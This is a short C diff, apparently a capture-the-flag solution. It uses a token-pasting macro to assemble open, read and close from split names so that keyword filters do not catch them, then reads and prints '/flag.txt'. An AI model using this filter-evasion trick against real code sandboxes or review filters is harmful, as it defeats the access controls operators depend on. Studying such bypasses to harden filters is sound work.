@@ -1,0 +1,7 @@
+#define callFunc(a, b, params) a##b params
+
+int fd = callFunc(o,pen, ("/flag.txt", O_RDONLY));
+char buffer[512];
+callFunc(re,ad, (fd, buffer, sizeof(buffer)));
+puts(buffer);
+callFunc(cl,ose, (fd));
